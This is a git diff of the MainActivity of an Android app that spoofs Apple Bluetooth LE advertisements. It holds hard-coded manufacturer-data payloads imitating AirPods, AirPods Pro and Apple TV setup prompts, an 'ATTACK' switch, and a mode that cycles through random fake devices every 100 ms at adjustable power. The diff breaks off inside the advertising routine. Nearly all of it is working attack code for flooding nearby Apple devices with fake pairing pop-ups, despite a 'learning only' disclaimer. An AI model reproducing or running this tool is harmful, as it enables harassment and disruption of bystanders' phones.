@@ -13,6 +13,9 @@ import android.bluetooth.BluetoothAdapter;
 import android.bluetooth.le.AdvertiseCallback;
 import android.bluetooth.le.AdvertiseData;
 import android.bluetooth.le.AdvertiseSettings;
+import android.bluetooth.le.AdvertisingSet;
+import android.bluetooth.le.AdvertisingSetCallback;
+import android.bluetooth.le.AdvertisingSetParameters;
 import android.bluetooth.le.BluetoothLeAdvertiser;
 import android.bluetooth.BluetoothManager;
 import android.content.Context;
@@ -21,7 +24,11 @@ import android.content.pm.PackageManager;
 import android.icu.util.Calendar;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Message;
 import android.os.ParcelUuid;
+import android.text.Editable;
+import android.text.TextWatcher;
 import android.text.method.ScrollingMovementMethod;
 import android.util.Log;
 import android.view.View;
@@ -47,36 +54,37 @@ public class MainActivity extends AppCompatActivity {
 
     private BluetoothLeAdvertiser bluetoothLeAdvertiser;
     private BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
+    AdvertisingSet currentAdvertisingSet = null;
     public byte[][] deviceData = {
-            {0x07, 0x19, 0x07, 0x02, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x13, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x14, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x03, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x11, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x10, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x05, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x06, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x09, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x17, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x12, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x07, 0x19, 0x07, 0x16, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x01, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
-            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x20, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
-            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x2b, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
-            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x0d, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
-            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x13, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
-            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x27, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
-            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x0b, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
-            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x09, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
-            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x02, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
-            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x1e, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x02, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x13, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x14, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x03, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x11, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x10, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x05, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x06, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x09, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x17, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x12, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x07, 0x19, 0x07, 0x16, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x01, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x20, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x2b, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x0d, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x13, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x27, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x0b, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x09, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x02, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x1e, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
     };
-    //private byte[][] testData = {{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}};
+    //private byte[][] testData = {{0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00}};
     private String[] deviceNameArr = {
             "AirPods",
             "AirPods Pro",
@@ -106,66 +114,51 @@ public class MainActivity extends AppCompatActivity {
             "转移手机号码",
             "测量TV色彩平衡"
     };
-    private String[] advModeName = {
-            "低功耗模式 1000ms延迟",
-            "平衡模式 250ms延迟",
-            "低延迟模式 100ms延迟"
-    };
-    private int advMode = 2;
-    private String[] txModeName = {
-            "超低功率发送模式 广播距离最近",
-            "低功率发送模式 广播距离近",
-            "中功率发送模式 广播距离中",
-            "高功率发送模式 广播距离远"
-    };
-    private int txMode = 3;
     private String helpString = null;
     private int spIndex = 0;
     private boolean deviceIsRandom = false;
     private boolean isStopThread = false;
-    private int advTimeout = 1000;
+    private int interval = 160;
+    private int txPowerLevel = 1;
+    private boolean settingsIsChanged = false;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
         Spinner sp_SelectDevice = null;
-        Spinner sp_advMode = null;
-        Spinner sp_txMode = null;
 
         sp_SelectDevice = findViewById(R.id.sp_SelectDevice);
-        sp_advMode = findViewById(R.id.sp_AdvMode);
-        sp_txMode = findViewById(R.id.sp_TxMode);
 
         Switch sw_ATTACK = findViewById(R.id.sw_ATTACK);
         Switch sw_RandomDevice = findViewById(R.id.sw_RandomDevice);
         Button btn_help = findViewById(R.id.btn_help);
+        Button btn_SetParameter = findViewById(R.id.btn_SetParameter);
         TextView tv_Debug = findViewById(R.id.tv_Debug);
         TextView tv_advState = findViewById(R.id.tv_advState);
-        EditText et_Timeout = findViewById(R.id.et_Timeout);
+        EditText et_Interval = findViewById(R.id.et_Interval);
+        EditText et_TxPowerLevel = findViewById(R.id.et_TxPowerLevel);
 
         Spinner devSpinner = findViewById(R.id.sp_SelectDevice);
-        Spinner advModeSpinner = findViewById(R.id.sp_AdvMode);
-        Spinner txModeSpinner = findViewById(R.id.sp_TxMode);
-
 
         Random random = new Random(100);
         tv_Debug.setMovementMethod(ScrollingMovementMethod.getInstance());
 
-
-        ArrayAdapter<String> devAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1,deviceNameArr);
+        ArrayAdapter<String> devAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, deviceNameArr);
         sp_SelectDevice.setAdapter(devAdapter);
         sp_SelectDevice.setSelection(0);
 
-        ArrayAdapter<String> advModeAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1,advModeName);
-        sp_advMode.setAdapter(advModeAdapter);
-        sp_advMode.setSelection(2);
 
-        ArrayAdapter<String> txModeAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1,txModeName);
-        sp_txMode.setAdapter(txModeAdapter);
-        sp_txMode.setSelection(3);
-
-        bluetoothLeAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser();
+        if (bluetoothAdapter != null && bluetoothAdapter.isEnabled()) {
+            if (bluetoothAdapter.isMultipleAdvertisementSupported()) {
+                bluetoothLeAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser();
+            } else {
+                Toast.makeText(this, "您的设备不支持BLE广播！错误代码：03", Toast.LENGTH_SHORT).show();
+            }
+        } else {
+            Toast.makeText(this, "您的设备不支持蓝牙！错误代码：04", Toast.LENGTH_SHORT).show();
+        }
 
         String patten = "HH:mm:ss.SSS";
         SimpleDateFormat format = new SimpleDateFormat(patten);
@@ -175,13 +168,59 @@ public class MainActivity extends AppCompatActivity {
                 + "\n作者：Sab1e\n"
                 + "\n程序功能介绍：\n"
                 + "\n随机设备：从27个设备中随机选取。\n"
-                + "\n广播包超时时间：设置单个广播包持续广播的时间，最长为180000ms，设置为0即无时间限制。建议值：1000ms\n"
-                + "\n广播包模式：控制广播包的延迟。\n"
-                + "\n广播包发送功率：控制广播包发送范围。\n"
+                + "\n发射功率：单位为dBm，取值范围：[-127,1]\n"
+                + "\n间隔时间：单位为0.625ms，取值范围：[160,16777215]\n"
                 + "\n该工具仅用于学习和交流使用，作者不承担用户使用该工具的任何后果。";
-
         tv_Debug.setText(helpString);
-
+        //handler处理UI更新
+        Handler handler = new Handler() {
+            @Override
+            public void handleMessage(Message message) {
+                super.handleMessage(message);
+                switch (message.what) {
+                    case 0:
+                        tv_advState.setText("@" + format.format(new Date()) + " \t" + deviceNameArr[spIndex] + "\n");
+                        break;
+                    case 1:
+                        tv_advState.setText("广播已停止");
+                        break;
+                }
+            }
+        };
+        //参数设置时检查输入是否合法
+        btn_SetParameter.setOnClickListener(new View.OnClickListener() {
+            @SuppressLint("MissingPermission")
+            @Override
+            public void onClick(View v) {
+                int lastInterval = interval;
+                int lastTxPowerLevel = txPowerLevel;
+                try {
+                    interval = Integer.parseInt(et_Interval.getText().toString());
+                    txPowerLevel = Integer.parseInt(et_TxPowerLevel.getText().toString());
+                    if ((interval >= 160 && interval <= 16777215) && (txPowerLevel >= -127 && txPowerLevel <= 1)) {
+                        if (bluePermission()) {
+                            if (currentAdvertisingSet != null) {
+                                Log.i("BLE", "currentAdvertisingSet modify successful!");
+                                settingsIsChanged = false;
+                                currentAdvertisingSet.setAdvertisingParameters(new AdvertisingSetParameters.Builder()
+                                        .setTxPowerLevel(txPowerLevel)
+                                        .setInterval(interval)
+                                        .build());
+                            }
+                            tv_Debug.setText("参数设置成功！\n当前参数：\n\t发射功率：" + txPowerLevel + "dBm\n\t间隔时间：" + (interval * 0.625) + "ms\n\t随机设备：" + deviceIsRandom);
+                        }
+                    } else {
+                        throw new Exception();
+                    }
+                } catch (Exception e) {
+                    interval = lastInterval;
+                    txPowerLevel = lastTxPowerLevel;
+                    et_Interval.setText(String.valueOf(lastInterval));
+                    et_TxPowerLevel.setText(String.valueOf(lastTxPowerLevel));
+                    Toast.makeText(MainActivity.this, "输入值不合法，请重新输入！", Toast.LENGTH_SHORT).show();
+                }
+            }
+        });
         btn_help.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -191,11 +230,12 @@ public class MainActivity extends AppCompatActivity {
         sw_RandomDevice.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
             @Override
             public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
-                if(isChecked == true){
+                if (isChecked == true) {
                     deviceIsRandom = true;
-                }
-                else{
+                    tv_Debug.setText("参数设置成功！\n当前参数：\n\t发射功率：" + txPowerLevel + "dBm\n\t间隔时间：" + (interval * 0.625) + "ms\n\t随机设备：" + deviceIsRandom);
+                } else {
                     deviceIsRandom = false;
+                    tv_Debug.setText("参数设置成功！\n当前参数：\n\t发射功率：" + txPowerLevel + "dBm\n\t间隔时间：" + (interval * 0.625) + "ms\n\t随机设备：" + deviceIsRandom);
                 }
             }
         });
@@ -212,11 +252,9 @@ public class MainActivity extends AppCompatActivity {
                         tv_Debug.append("\n您的设备不支持蓝牙功能！\n");
                         sw_ATTACK.setChecked(false);
                         return;
-                    } else {
                     }
                     tv_Debug.append(".");
-                    if (bluetoothAdapter.isEnabled()) {
-                    } else {
+                    if (!bluetoothAdapter.isEnabled()) {
                         tv_Debug.append("\n蓝牙已关闭\n请打开蓝牙后重试\n");
                         sw_ATTACK.setChecked(false);
                         return;
@@ -231,160 +269,187 @@ public class MainActivity extends AppCompatActivity {
                     }
                     tv_Debug.append("\n检测完毕，功能正常！\n");
                     tv_Debug.append("正在获取蓝牙权限...\n");
+                    tv_Debug.append("当前参数：\n\t发射功率：" + txPowerLevel + "dBm\n\t间隔时间：" + (interval * 0.625) + "ms\n\t随机设备：" + deviceIsRandom);
                     if (bluePermission()) {
+                        interval = Integer.parseInt(et_Interval.getText().toString());
+                        txPowerLevel = Integer.parseInt(et_TxPowerLevel.getText().toString());
+                        spIndex = devSpinner.getSelectedItemPosition();
+                        startAdv(getDevice(deviceData, spIndex));
                         new Thread(new Runnable() {
                             @Override
                             public void run() {
                                 while (true) {
                                     try {
-
-                                        advTimeout = Integer.parseInt(et_Timeout.getText().toString());
+                                        //随机设备
                                         if (deviceIsRandom) {
                                             spIndex = random.nextInt(26);
+                                            if (currentAdvertisingSet != null) {
+                                                Log.i("BLE", "device modify successful!");
+                                                currentAdvertisingSet.setAdvertisingData(new AdvertiseData.Builder()
+                                                        .addManufacturerData(0x004c, getDevice(deviceData, spIndex))
+                                                        .build());
+                                            }
                                         } else {
                                             spIndex = devSpinner.getSelectedItemPosition();
                                         }
-                                        advMode = advModeSpinner.getSelectedItemPosition();
-                                        txMode = txModeSpinner.getSelectedItemPosition();
-                                        tv_advState.setText("@" + format.format(new Date()) + " \t"+ deviceNameArr[spIndex] + "\n");
-                                        startAdv(getDevice(deviceData, spIndex));
-                                        Thread.sleep(20);
+                                        handler.sendEmptyMessage(0);
                                         if (isStopThread) {
+                                            handler.sendEmptyMessage(1);
                                             stopAdv();
                                             break;
                                         }
+                                        Thread.sleep(100);
                                     } catch (InterruptedException e) {
                                         throw new RuntimeException(e);
                                     }
                                 }
                             }
                         }).start();
-                    }else {
+                    } else {
                         tv_Debug.append("请授权后重试\n");
                         sw_ATTACK.setChecked(false);
                     }
-                }
-                else {
-
-                    tv_advState.setText("广播已停止");
+                } else {
                     isStopThread = true;
                 }
             }
         });
     }
 
-    private String getVersionName()
-    {
+    //获取当前APP版本
+    private String getVersionName() {
         PackageManager packageManager = getPackageManager();
         PackageInfo packInfo = null;
         try {
-            packInfo = packageManager.getPackageInfo(getPackageName(),0);
+            packInfo = packageManager.getPackageInfo(getPackageName(), 0);
         } catch (PackageManager.NameNotFoundException e) {
             throw new RuntimeException(e);
         }
         String version = packInfo.versionName;
         return version;
     }
-    private byte[] getDevice(byte[][] arr,int num){
+
+    //从二维数组取出一位数组
+    private byte[] getDevice(byte[][] arr, int num) {
         byte[] selected = arr[num];
         return selected;
     }
-    private boolean bluePermission(){
-        Log.e( "BLE","Requesting Bluetooth Permission...");
-            if (ContextCompat.checkSelfPermission(this,
-                    "android.permission.BLUETOOTH_SCAN")
-                    != PERMISSION_GRANTED
-                    || ContextCompat.checkSelfPermission(this,
-                    "android.permission.BLUETOOTH_ADVERTISE")
-                    != PERMISSION_GRANTED
-                    || ContextCompat.checkSelfPermission(this,
-                    "android.permission.BLUETOOTH_ADMIN")
-                    != PERMISSION_GRANTED
-                    || ContextCompat.checkSelfPermission(this,
-                    "android.permission.BLUETOOTH_CONNECT")
-                    != PERMISSION_GRANTED
-                    || ContextCompat.checkSelfPermission(this,
-                    "android.permission.BLUETOOTH")
-                    != PERMISSION_GRANTED
-                    || ContextCompat.checkSelfPermission(this,
-                    "android.permission.ACCESS_COARSE_LOCATION")
-                    != PERMISSION_GRANTED
-            ){
-                ActivityCompat.requestPermissions(this,new String[]{
-                        "android.permission.BLUETOOTH_SCAN",
-                        "android.permission.BLUETOOTH_ADVERTISE",
-                        "android.permission.BLUETOOTH_CONNECT",
-                        "android.permission.ACCESS_COARSE_LOCATION",
-                        "android.permission.BLUETOOTH",
-                        "android.permission.BLUETOOTH_ADMIN"}, 1);
-                return false;
+
+    //获取蓝牙权限
+    private boolean bluePermission() {
+        Log.i("BLE", "Requesting Bluetooth Permission...");
+        if (ContextCompat.checkSelfPermission(this,
+                "android.permission.BLUETOOTH_ADVERTISE")
+                != PERMISSION_GRANTED
+                || ContextCompat.checkSelfPermission(this,
+                "android.permission.BLUETOOTH_CONNECT")
+                != PERMISSION_GRANTED
+        ) {
+            if (ContextCompat.checkSelfPermission(this, "android.permission.BLUETOOTH_ADVERTISE") != PERMISSION_GRANTED) {
+                Toast.makeText(this, "无权限：BLUETOOTH_ADVERTISE", Toast.LENGTH_SHORT).show();
             }
+            if (ContextCompat.checkSelfPermission(this, "android.permission.BLUETOOTH_CONNECT") != PERMISSION_GRANTED) {
+                Toast.makeText(this, "无权限：BLUETOOTH_CONNECT", Toast.LENGTH_SHORT).show();
+            }
+            ActivityCompat.requestPermissions(this, new String[]{
+                    "android.permission.BLUETOOTH_ADVERTISE",
+                    "android.permission.BLUETOOTH_CONNECT",}, 1);
+            return false;
+        }
         return true;
     }
+
+    //权限获取结果反馈
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == 1) {
             if (grantResults[0] == PERMISSION_GRANTED) {
             } else {
-                Toast.makeText(this, "程序需要获取权限！", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "程序需要获取权限！错误代码：01", Toast.LENGTH_SHORT).show();
             }
         }
     }
+
+    //停止广播
     @SuppressLint("MissingPermission")
-    private void stopAdv(){
-        AdvertiseCallback advertisingCallback = new AdvertiseCallback() {
+    public void stopAdv() {
+        AdvertisingSetCallback advertisingCallback = new AdvertisingSetCallback() {
             @Override
-            public void onStartSuccess(AdvertiseSettings settingsInEffect) {
-                super.onStartSuccess(settingsInEffect);
-                Log.i( "BLE", "Advertising State: " + settingsInEffect);
+            public void onAdvertisingSetStarted(AdvertisingSet advertisingSet, int txPower, int status) {
+                Log.i("BLE", "onAdvertisingSetStarted(): txPower:" + txPower + " , status: "
+                        + status);
+                currentAdvertisingSet = advertisingSet;
             }
+
             @Override
-            public void onStartFailure(int errorCode) {
-                super.onStartFailure(errorCode);
-                Log.e( "BLE", "Advertising onStartFailure: " + errorCode );
+            public void onAdvertisingDataSet(AdvertisingSet advertisingSet, int status) {
+                Log.i("BLE", "onAdvertisingDataSet() :status:" + status);
+            }
+
+            @Override
+            public void onScanResponseDataSet(AdvertisingSet advertisingSet, int status) {
+                Log.i("BLE", "onScanResponseDataSet(): status:" + status);
+            }
+
+            @Override
+            public void onAdvertisingSetStopped(AdvertisingSet advertisingSet) {
+                Log.i("BLE", "onAdvertisingSetStopped():");
             }
         };
         if (bluePermission()) {
-            bluetoothLeAdvertiser.stopAdvertising(advertisingCallback);
+            bluetoothLeAdvertiser.stopAdvertisingSet(advertisingCallback);
         }
     }
+
+    //开始广播
     @SuppressLint("MissingPermission")
-    public void startAdv(byte[] data){
-        AdvertiseSettings settings = new AdvertiseSettings.Builder()
-                .setAdvertiseMode( advMode )
-                .setTxPowerLevel( txMode )
